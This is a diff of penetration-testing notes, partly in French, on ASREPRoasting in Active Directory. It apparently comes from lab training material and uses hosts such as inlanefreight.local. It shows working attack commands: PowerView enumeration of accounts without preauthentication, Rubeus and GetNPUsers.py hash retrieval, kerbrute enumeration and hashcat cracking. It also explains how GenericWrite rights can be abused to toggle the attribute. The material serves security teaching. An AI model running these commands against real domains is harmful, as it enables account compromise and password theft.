@@ -2,7 +2,7 @@
 
 ### <mark style="color:blue;">ASREPRoasting</mark>
 
-{% hint style="info" %}
+{% hint style="warning" %}
 Il est possible d’obtenir le **Ticket Granting Ticket (TGT)** pour n’importe quel compte ayant l’option **"Ne pas exiger l’authentification préalable Kerberos"** activée.
 
 De nombreux guides d’installation de fournisseurs recommandent de configurer ainsi leurs **comptes de service**.
@@ -54,11 +54,9 @@ Ce **TGT chiffré** peut ensuite être soumis à une **attaque hors ligne sur le
 
 Un **SPN (Service Principal Name)** n'est pas requis.
 
-Ce paramètre peut être **énuméré** avec **PowerView** ou des outils intégrés tels que le module **PowerShell AD**.
-
-L'attaque elle-même peut être effectuée avec l’outil **Rubeus** et d'autres outils pour obtenir le **ticket** du compte cible.
-
+{% hint style="warning" %}
 Si un attaquant a les permissions **GenericWrite** ou **GenericAll** sur un compte, il peut **activer cet attribut** et obtenir le **ticket AS-REP** pour **le casser hors ligne** afin de récupérer le **mot de passe du compte**, puis **désactiver l’attribut** à nouveau.
+{% endhint %}
 
 Comme pour **Kerberoasting**, le succès de cette attaque dépend du fait que le compte ait un **mot de passe relativement faible**.
 
@@ -69,10 +67,6 @@ Ci-dessous se trouve un exemple de l'attaque. **PowerView** peut être utilisé 
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell-session
 PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
-
-samaccountname     : mmorgan
-userprincipalname  : mmorgan@inlanefreight.local
-useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
 ```
 {% endcode %}
 
@@ -81,8 +75,6 @@ useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell-session
 PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
-[*] AS-REP hash:
-     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D16CA
 ```
 {% endcode %}
 
@@ -90,11 +82,8 @@ We can then crack the hash offline using Hashcat with mode `18200`.
 
 <mark style="color:green;">**Cracking the Hash Offline with Hashcat**</mark>
 
-{% code overflow="wrap" fullWidth="true" %}
-```shell-session
-mrroboteLiot@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
-```
-{% endcode %}
+<pre class="language-shell-session" data-overflow="wrap" data-full-width="true"><code class="lang-shell-session"><strong>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
+</strong></code></pre>
 
 When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
 
@@ -102,10 +91,7 @@ When performing user enumeration with `Kerbrute`, the tool will automatically re
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
-
-2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
-$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:431a9c0a
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 ```
 {% endcode %}
 
@@ -113,6 +99,6 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:431a9c0a
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
 ```
 {% endcode %}
